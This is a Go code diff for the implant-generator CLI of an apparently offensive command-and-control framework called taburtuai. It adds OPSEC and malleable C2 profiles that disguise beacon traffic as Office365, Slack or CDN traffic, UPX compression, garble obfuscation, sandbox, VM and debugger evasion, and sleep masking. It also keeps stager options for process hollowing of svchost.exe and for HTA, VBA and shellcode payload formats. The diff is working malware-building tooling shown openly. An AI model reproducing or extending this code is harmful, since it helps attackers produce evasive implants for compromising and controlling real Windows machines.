@@ -2,13 +2,14 @@ package main
 
 import (
 	"bytes"
-	"encoding/base64"
+	"crypto/sha256"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
 
 	"github.com/spf13/cobra"
 )
@@ -36,9 +37,9 @@ var stagerCmd = &cobra.Command{
 
 func init() {
 	stagerCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
-	stagerCmd.Flags().String("c2", "", "C2 server URL (alias for --server)")  // backwards compat
+	stagerCmd.Flags().String("c2", "", "C2 server URL (alias for --server)")
 	stagerCmd.Flags().String("token", "", "Stage token (required — from 'stage upload')")
-	stagerCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key (must match server ENCRYPTION_KEY)")
+	stagerCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
 	stagerCmd.Flags().String("exec-method", "drop", "Execution method: drop|hollow|thread")
 	stagerCmd.Flags().String("hollow-exe", `C:\Windows\System32\svchost.exe`, "Hollow target process")
 	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll")
@@ -47,6 +48,7 @@ func init() {
 	stagerCmd.Flags().String("output", "", "Output file path (default: auto-named in current dir)")
 	stagerCmd.Flags().Bool("no-strip", false, "Keep debug symbols (larger binary)")
 	_ = stagerCmd.MarkFlagRequired("token")
+	_ = stagerCmd.MarkFlagRequired("key")
 }
 
 func runStager(cmd *cobra.Command, _ []string) error {
@@ -139,26 +141,36 @@ var stagelessCmd = &cobra.Command{
     --key MyAESKey \
     --interval 60 --jitter 20 \
     --kill-date 2026-12-31 \
-    --format exe \
+    --output bin/implant.exe
+
+  # Use an OPSEC profile YAML (overrides interval/jitter/evasion flags):
+  taburtuai-generate stageless \
+    --c2 https://c2.example.com \
+    --key MyAESKey \
+    --profile profiles/stealth.yaml \
     --output bin/implant.exe`,
 	RunE: runStageless,
 }
 
 func init() {
-	stagelessCmd.Flags().String("c2", "http://127.0.0.1:8080", "C2 server URL")
-	stagelessCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key")
-	stagelessCmd.Flags().String("secondary-key", "TaburtuaiSecondary", "Secondary key")
+	stagelessCmd.Flags().String("c2", "", "C2 server URL")
+	stagelessCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
+	stagelessCmd.Flags().String("secondary-key", "", "Secondary AES key (must match server SECONDARY_KEY)")
 	stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
 	stagelessCmd.Flags().Int("jitter", 20, "Jitter percent")
 	stagelessCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD")
 	stagelessCmd.Flags().String("exec-method", "powershell", "Default exec method")
 	stagelessCmd.Flags().Bool("evasion", true, "Enable evasion features")
 	stagelessCmd.Flags().Bool("sleep-mask", true, "Enable sleep masking")
-	stagelessCmd.Flags().String("format", "exe", "Output format: exe|dll-sideload")
 	stagelessCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
 	stagelessCmd.Flags().Bool("no-gui", true, "Hide console window (-H windowsgui)")
 	stagelessCmd.Flags().Bool("garble", false, "Use garble obfuscation (requires garble in PATH)")
+	stagelessCmd.Flags().Bool("compress", false, "UPX-compress the output binary")
+	stagelessCmd.Flags().String("profile", "", "Path to OPSEC profile YAML (overrides evasion flags)")
+	stagelessCmd.Flags().String("c2-profile", "", "Malleable C2 profile name: default|office365|cdn|jquery|slack|ocsp")
 	stagelessCmd.Flags().String("output", "", "Output file path")
+	_ = stagelessCmd.MarkFlagRequired("c2")
+	_ = stagelessCmd.MarkFlagRequired("key")
 }
 
 func runStageless(cmd *cobra.Command, _ []string) error {
@@ -174,41 +186,77 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	arch, _ := cmd.Flags().GetString("arch")
 	noGUI, _ := cmd.Flags().GetBool("no-gui")
 	useGarble, _ := cmd.Flags().GetBool("garble")
+	compress, _ := cmd.Flags().GetBool("compress")
+	profilePath, _ := cmd.Flags().GetString("profile")
+	c2ProfileName, _ := cmd.Flags().GetString("c2-profile")
 	output, _ := cmd.Flags().GetString("output")
 
-	exePath, tmpDir, err := compileAgent(agentOpts{
-		C2URL:        c2,
-		Key:          key,
+	var profile *OpsecProfile
+	if profilePath != "" {
+		var err error
+		profile, err = LoadProfile(profilePath)
+		if err != nil {
+			return fmt.Errorf("load profile: %w", err)
+		}
+		fmt.Printf("[*] Using profile: %s\n", profile.Name)
+	} else if c2ProfileName != "" {
+		fmt.Printf("[*] Using C2 profile: %s\n", c2ProfileName)
+		profile = &OpsecProfile{
+			SleepInterval:      time.Duration(interval) * time.Second,
+			JitterPercent:      jitter,
+			KillDate:           killDate,
+			ExecMethod:         execMethod,
+			EnableSandboxCheck: evasion,
+			EnableVMCheck:      evasion,
+			EnableDebugCheck:   evasion,
+			SleepMasking:       sleepMask,
+			Obfuscate:          useGarble,
+		}
+	} else {
+		profile = &OpsecProfile{
+			SleepInterval:      time.Duration(interval) * time.Second,
+			JitterPercent:      jitter,
+			KillDate:           killDate,
+			ExecMethod:         execMethod,
+			EnableSandboxCheck: evasion,
+			EnableVMCheck:      evasion,
+			EnableDebugCheck:   evasion,
+			SleepMasking:       sleepMask,
+			Obfuscate:          useGarble,
+		}
+	}
+
+	outDir := "."
+	outName := "implant_" + arch
+	if output != "" {
+		outDir = filepath.Dir(output)
+		outName = strings.TrimSuffix(filepath.Base(output), ".exe")
+	}
+
+	g := New(filepath.Join(moduleRoot(), "cmd", "agent"))
+	fmt.Printf("[*] Compiling agent (%s/windows)...\n", arch)
+	result, err := g.Build(&Config{
+		ServerURL:    c2,
+		EncKey:       key,
 		SecondaryKey: secKey,
-		Interval:     fmt.Sprintf("%d", interval),
-		Jitter:       fmt.Sprintf("%d", jitter),
-		KillDate:     killDate,
-		ExecMethod:   execMethod,
-		Evasion:      evasion,
-		SleepMask:    sleepMask,
-		Arch:         arch,
+		TargetOS:     OSWindows,
+		TargetArch:   TargetArch(arch),
+		Format:       FormatEXE,
+		OutputDir:    outDir,
+		OutputName:   outName,
+		StripSyms:    true,
 		NoGUI:        noGUI,
-		Garble:       useGarble,
+		Compress:     compress,
+		Profile:      profile,
 	})
 	if err != nil {
-		return fmt.Errorf("compile agent: %w", err)
-	}
-	if tmpDir != "" {
-		defer os.RemoveAll(tmpDir)
-	}
-
-	agentBytes, err := os.ReadFile(exePath)
-	if err != nil {
-		return fmt.Errorf("read agent binary: %w", err)
-	}
-
-	if output == "" {
-		output = "implant_" + arch + ".exe"
-	}
-	if err := os.WriteFile(output, agentBytes, 0755); err != nil {
 		return err
 	}
-	fmt.Printf("[+] Stageless implant: %s (%d KB)\n", output, len(agentBytes)/1024)
+	fmt.Printf("[+] Stageless implant : %s\n", result.OutputPath)
+	fmt.Printf("    Size              : %d KB\n", result.FileSize/1024)
+	fmt.Printf("    SHA256            : %s\n", result.SHA256)
+	fmt.Printf("    MD5               : %s\n", result.MD5)
+	fmt.Printf("    Build time        : %s\n", result.BuildTime.Round(time.Millisecond))
 	return nil
 }
 
@@ -335,82 +383,6 @@ func compileStager(o compileOpts) (exePath, tmpDir string, err error) {
 	return outFile, tmpDir, nil
 }
 
-type agentOpts struct {
-	C2URL        string
-	Key          string
-	SecondaryKey string
-	Interval     string
-	Jitter       string
-	KillDate     string
-	ExecMethod   string
-	Evasion      bool
-	SleepMask    bool
-	Arch         string
-	NoGUI        bool
-	Garble       bool
-}
-
-// compileAgent cross-compiles the full agent for Windows.
-func compileAgent(o agentOpts) (exePath, tmpDir string, err error) {
-	tmpDir, err = os.MkdirTemp("", "taburtuai-agent-*")
-	if err != nil {
-		return "", "", err
-	}
-
-	outFile := filepath.Join(tmpDir, "agent.exe")
-
-	ldflagParts := []string{
-		"-s", "-w",
-		fmt.Sprintf("-X main.serverURL=%s", o.C2URL),
-		fmt.Sprintf("-X main.encKey=%s", o.Key),
-		fmt.Sprintf("-X main.secondaryKey=%s", o.SecondaryKey),
-		fmt.Sprintf("-X main.defaultInterval=%s", o.Interval),
-		fmt.Sprintf("-X main.defaultJitter=%s", o.Jitter),
-		fmt.Sprintf("-X main.defaultExecMethod=%s", o.ExecMethod),
-		fmt.Sprintf("-X main.defaultEnableEvasion=%v", o.Evasion),
-		fmt.Sprintf("-X main.defaultSleepMasking=%v", o.SleepMask),
-	}
-	if o.KillDate != "" {
-		ldflagParts = append(ldflagParts, fmt.Sprintf("-X main.defaultKillDate=%s", o.KillDate))
-	}
-	if o.NoGUI {
-		ldflagParts = append(ldflagParts, "-H", "windowsgui")
-	}
-	ldflags := strings.Join(ldflagParts, " ")
-
-	goArch := o.Arch
-	if goArch == "" {
-		goArch = "amd64"
-	}
-
-	var c *exec.Cmd
-	if o.Garble {
-		c = exec.Command("garble", "-tiny", "-literals", "-seed=random",
-			"build", "-ldflags", ldflags, "-o", outFile, "./agent")
-	} else {
-		c = exec.Command("go", "build", "-ldflags", ldflags, "-o", outFile, "./agent")
-	}
-	c.Env = append(os.Environ(),
-		"GOOS=windows",
-		fmt.Sprintf("GOARCH=%s", goArch),
-		"CGO_ENABLED=0",
-	)
-	c.Dir = moduleRoot()
-
-	var buf bytes.Buffer
-	c.Stdout = &buf
-	c.Stderr = &buf
-
-	fmt.Printf("[*] Compiling agent (%s/windows)...\n", goArch)
-	if err := c.Run(); err != nil {
-		return "", tmpDir, fmt.Errorf("go build failed:\n%s", buf.String())
-	}
-
-	info, _ := os.Stat(outFile)
-	fmt.Printf("[+] Agent compiled: %d KB\n", info.Size()/1024)
-	return outFile, tmpDir, nil
-}
-
 // ── misc helpers ──────────────────────────────────────────────────────────────
 
 // moduleRoot returns the directory containing go.mod (project root).
@@ -446,11 +418,10 @@ func writeOutput(path, defaultExt string, data []byte) error {
 	if err := os.WriteFile(path, data, 0644); err != nil {
 		return err
 	}
-	fmt.Printf("[+] Output: %s (%d bytes)\n", path, len(data))
+	sum := sha256.Sum256(data)
+	fmt.Printf("[+] Output  : %s\n", path)
+	fmt.Printf("    Size    : %d bytes\n", len(data))
+	fmt.Printf("    SHA256  : %x\n", sum)
 	return nil
 }
 
-// base64Encode returns the standard base64 encoding of data.
-func base64Encode(data []byte) string {
-	return base64.StdEncoding.EncodeToString(data)
-}
